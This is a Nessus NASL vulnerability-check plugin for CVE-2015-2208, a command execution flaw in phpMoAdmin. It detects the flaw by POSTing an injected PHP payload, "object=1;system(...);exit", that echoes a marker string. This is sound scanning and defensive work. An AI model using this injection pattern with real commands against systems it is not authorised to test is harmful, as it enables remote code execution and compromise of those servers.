#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(84217);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/11/14 14:25:31 $");

  script_cve_id("CVE-2015-2208");
  script_bugtraq_id(72877);
  script_osvdb_id(118994);
  script_xref(name:"EDB-ID", value:"36251");

  script_name(english:"phpMoAdmin saveObject Remote Command Execution");
  script_summary(english:"Attempts to run a command on the system.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a command execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting a version of phpMoAdmin that is
affected by a remote code execution vulnerability due to improper
sanitization of input passed via the 'object' POST parameter in the
saveObject() function in the moadmin.php script. A remote attacker can
exploit this, via a specially crafted request, to execute arbitrary
commands.");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmoadmin.com/");
  script_set_attribute(attribute:"solution", value:
"There is currently no patch publicly available.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PHPMoAdmin 1.1.2 Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/03/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/06/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:avinu:phpmoadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("phpmoadmin_detect.nasl");
  script_require_keys("installed_sw/phpMoAdmin");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "phpMoAdmin";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(app_name:app, port:port);
url = install['path'];

# create a unique string that we can have echoed
# back from the application
result  = "phpmoadmin_saveobject_rce.nasl " + unixtime();
command = 'echo "' + result + '"';

res = http_send_recv3(
  method       : "POST",
  item         : url,
  port         : port,
  data         : "object=1;system('" + command + "');exit",
  add_headers  : make_array("Content-Type", "application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);

if (result >< res[2])
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    generic     : TRUE,
    request     : make_list(http_last_sent_request()),
    output      : res[2]
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:url, port:port));
